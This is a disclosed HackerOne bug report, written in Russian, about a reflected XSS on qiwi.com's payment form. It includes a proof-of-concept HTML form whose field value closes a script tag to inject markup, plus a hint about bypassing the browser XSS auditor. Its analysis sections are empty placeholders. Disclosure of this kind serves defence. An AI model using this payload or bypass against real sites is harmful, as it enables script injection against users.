---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '263684'
original_report_id: '263684'
title: '[qiwi.com] XSS on payment form'
weakness: Cross-site Scripting (XSS) - Reflected
team_handle: qiwi
created_at: '2017-08-26T20:07:30.156Z'
disclosed_at: '2017-10-17T10:10:20.848Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 28
tags:
- hackerone
- cross-site-scripting-xss-reflected
---

# [qiwi.com] XSS on payment form

## Metadata

- HackerOne Report ID: 263684
- Weakness: Cross-site Scripting (XSS) - Reflected
- Program: qiwi
- Disclosed At: 2017-10-17T10:10:20.848Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

Высылаем POST 
```
<form action="https://qiwi.com/payment/form/25598" method="POST">
	<input type="text" name="extra['account']" value="(999)999-99-99'&quot;></script><font color=RED size=+15>HACKED</font>">
	<input type="submit">
</form>
```
В чем дело? Символы ", %{BYTS} фильтруются, но не фильтруется `/` символ
Из за этого мы можем тупо закрыть скрипт при помощи `</script>` и писать все, что угодно
P.S. >>> Можно забайпасить X-XSS-Auditor при помощи ваших обработок %00 и тп символов :)

Что в итоге выходит? F216159

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
